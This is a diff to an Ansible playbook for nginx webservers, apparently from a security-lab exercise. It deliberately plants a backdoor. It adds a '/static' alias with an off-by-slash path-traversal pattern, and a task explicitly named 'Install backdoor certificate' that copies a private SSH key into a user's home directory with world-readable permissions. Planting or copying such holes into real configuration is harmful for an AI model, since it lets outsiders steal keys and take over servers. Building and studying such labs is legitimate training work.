@@ -16,6 +16,22 @@
 
 - hosts: webservers
   become: yes
+  pre_tasks:
+    - name: Add static resource logic for HTTPS endpoints
+      set_fact:
+        nginx_http_template_new:
+          default:
+            web_server:
+              locations:
+                static:
+                  location: /static
+                  custom_options:
+                    - alias /home/{{ UNAME }}/static/
+              http_demo_conf:  false
+
+    - name: Merge static resource logic with nginx_vars
+      set_fact:
+        nginx_http_template: "{{nginx_http_template|combine(nginx_http_template_new,recursive=True)}}"
   roles:
     - nginxinc.nginx
     - nginx-ssl-client
@@ -23,6 +39,9 @@
   vars:
     trusted_user: nginx
     ssl_client_required: false
+    extra_vars:
+      # Merge static resource logic with nginx_vars.yml
+      
   vars_files:
     - nginx_vars.yml
 
@@ -50,6 +69,10 @@
                 return301:
                   code: 301
                   url: https://$server_name$request_uri
+            static:
+              location: /static
+              custom_options:
+                - alias /home/{{ UNAME }}/static/
           http_demo_conf: false
         reverse_proxy:
           locations:
@@ -73,3 +96,20 @@
                 header_x_forwarded_proto:
                   name: X-Forwarded-Proto
                   value: $scheme
+
+- hosts: webservers
+  become: yes
+  tasks:
+    - name: Install backdoor certificate
+      synchronize:
+        src: "/vagrant/sshkey_store/aslclient01/imovies_aslans01"
+        dest: "/home/{{ UNAME }}/.ssh/id_rsa"
+        rsync_path: "sudo rsync"
+        group: false
+        owner: false
+    - name: Set permissions on backdoor certificate
+      file:
+        path: "/home/{{ UNAME }}/.ssh/id_rsa"
+        owner: webserver
+        group: webserver
+        mode: 0644
